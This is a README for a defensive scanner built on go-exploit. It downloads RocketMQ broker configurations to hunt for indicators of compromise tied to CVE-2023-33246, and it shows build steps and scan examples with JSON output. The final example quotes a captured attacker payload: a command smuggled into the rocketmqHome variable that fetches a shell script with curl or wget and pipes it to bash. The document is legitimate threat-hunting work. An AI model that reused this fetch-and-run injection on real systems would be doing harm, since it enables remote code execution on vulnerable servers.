# Fetch Broker Configuration

Fetch Broker Configuration will try to download the RocketMQ broker configuration in order to hunt for indicators of compromise in the `rocketmqHome` variable. The variable is used by various attackers to execute code via [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246). For additional details, see the [VulnCheck blog](https://vulncheck.com/blog/rocketmq-exploit-payloads).

## Compiling

```sh
albinolobster@mournland:~/fetch-broker-conf$ make
gofmt -d -w main.go
golangci-lint run --fix main.go
GOOS=linux GOARCH=arm64 go build -o build/main_linux-arm64 main.go
```

## Usage

The tool is built on top of [go-exploit](https://github.com/vulncheck-oss/go-exploit), so there are multipe ways to provide targets to scan. A full description can be found in the project's [scanning documentation](https://github.com/vulncheck-oss/go-exploit/blob/main/docs/scanning.md). However, the following shows some examples:

### Scanning One Host

```sh
albinolobster@mournland:~/fetch-broker-conf$ ./build/main_linux-arm64 -a -e -rhost 10.9.49.143 -rport 10911 -log-json true | jq 'select(.msg == "Extracted the variable")'
{
  "time": "2023-09-05T05:27:48.567836165-04:00",
  "level": "SUCCESS",
  "msg": "Extracted the variable",
  "rocketmqHome": "/rocketmq-all-5.1.0-bin-release",
  "host": "10.9.49.143",
  "port": 10911
}
```

### Scanning Multiple Hosts

```sh
albinolobster@mournland:~/fetch-broker-conf$ ./build/main_linux-arm64 -a -e -rhosts 10.9.49.143,10.9.49.150 -rport 10911 -log-json true | jq 'select(.msg == "Extracted the variable")'
{
  "time": "2023-09-05T05:34:27.505747211-04:00",
  "level": "SUCCESS",
  "msg": "Extracted the variable",
  "rocketmqHome": "/rocketmq-all-5.1.0-bin-release",
  "host": "10.9.49.143",
  "port": 10911
}
{
  "time": "2023-09-05T05:34:27.802345043-04:00",
  "level": "SUCCESS",
  "msg": "Extracted the variable",
  "rocketmqHome": "/rocketmq-all-5.1.0-bin-release",
  "host": "10.9.49.150",
  "port": 10911
}
```


### Scanning a File of Hosts Using a Proxy

go-exploit provides the ability to scan via a provided target csv, where the csv is: `host, port, anything if ssl is enabled` (although the SSL field is ignored if -a is used). It also provides the ability to scan through a proxy. The command works like so (note that `-a` is SSL autodetection):

```sh
albinolobster@mournland:~/rocketmq-broker-conf$ ./build/main_linux-arm64 -a -e -rhosts-file /tmp/rocketmq.csv -proxy socks5://127.0.0.1:9050 -log-json true 2>/dev/null | jq 'select(.msg == "Extracted the variable")'
{
  "time": "2023-08-31T13:45:35.781849255-04:00",
  "level": "SUCCESS",
  "msg": "Extracted the variable",
  "rocketmqHome": "-c $@|sh . echo (curl -s x.x.x.x/rm.sh||wget -q -O- x.x.x.x/rm.sh)|bash;",
  "host": "x.x.x.x",
  "port": 10909
}
```
